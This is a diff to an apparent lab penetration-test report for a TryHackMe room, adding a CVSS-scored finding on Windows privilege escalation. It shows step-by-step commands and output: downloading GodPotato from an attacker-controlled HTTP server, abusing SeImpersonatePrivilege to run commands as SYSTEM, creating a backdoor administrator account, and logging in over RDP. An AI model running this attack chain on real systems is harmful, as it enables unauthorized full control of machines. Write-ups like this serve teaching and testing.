@@ -55,15 +55,99 @@ The server-side upload handling must validate and restrict uploads (validate MIM
 ---
 
 ### 2. 
-**CVSS v4.0 Base Score:**
+**CVSS v4.0 Base Score:** 9.2 (Critical)  
+CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:H/SA:N  
 
-**CVSS Justification:**
+**CVSS Justification:**  
+A low-privileged local account (`evader`) could leverage the granted `SeImpersonatePrivilege` to impersonate a SYSTEM token and execute processes as `NT AUTHORITY\SYSTEM`. This allowed creation of an administrative user and full system-level access. The attack requires local access (AV:L) but is low in complexity to perform (AC:L) when the privilege is present, and yields sever confidentiality/integrity impact.  
 
-**Summary:**
+**Summary:**  
+The `evader` user had `SeImpersonatePrivilege`, which was abused using a public exploit (GodPotato) to obtain `NT AUTHORITY\SYSTEM` execution context. This context was used to create a new administrative user (`tester`) which then allowed RDP access and gull GUI administrative control.  
 
-**Background:** 
+**Background:**  
+Windows systems with `SeImpersonatePrivilege` (or similar impersonation rights) are susceptible to token impersonation techniques (various "Potato" families). The target permitted local abuse of this privilege. This allows attackers to perform actions on the target system with the privilege of `NT AUTHORITY\SYSTEM`.  
 
-**Technical details & Evidence:** 
+**Technical details & Evidence:**  
+Local privilege escalation was achieved using GodPotato which has been listed in the appendices.  
+
+The first step was to transfer the GodPotato binary to the target machine via an attacker-controlled HTTP server.
+```bash
+python3 -m http.server 5050     
+Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
+10.201.104.177 - - [03/Oct/2025 20:26:07] "GET /potato.exe HTTP/1.1" 200 -
+```
+```powershell
+evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/potato.exe -outfile potato.exe
+```
+Once the binary was transferred to the target host the `/whoami` command was executed to validate `SYSTEM` execution:
+```powershell
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
+Removed for brevity
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2252
+```
+Using GodPotato to execute system commands, an administrative user was created:
+```powershell
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester Password123 /add"
+Removed for brevity
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 828
+The command completed successfully.
+...
+evader@HostEvasion:C:\xampp\htdocs# net users
+
+User accounts for \\HOSTEVASION
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           evader
+Guest                    tester                   WDAGUtilityAccount
+The command completed successfully.
+```
+The newly created `tester` user was then granted access to the `administrators` group:
+```powershell
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net localgroup administrators tester /add"
+Removed for brevity
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2592
+The command completed successfully.
+...
+evader@HostEvasion:C:\xampp\htdocs# net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+tester
+The command completed successfully.
+```
+With the `tester` account in the Administrators group, RDP into the hose was achieved:
+```bash
+xfreerdp3 /v:HostEvasion /u:tester /p:Password123
+```  
+![RDP - start.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/RDP%20-%20start.png)  
+
+The `tester` session was used to accept UAD and retrieve sensitive data from the target system.
+
 
 **Impact:** 
 
@@ -72,3 +156,4 @@ The server-side upload handling must validate and restrict uploads (validate MIM
 ---
 ## Appendices  
 [P0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  
+[GodPotato](https://github.com/BeichenDream/GodPotato)  
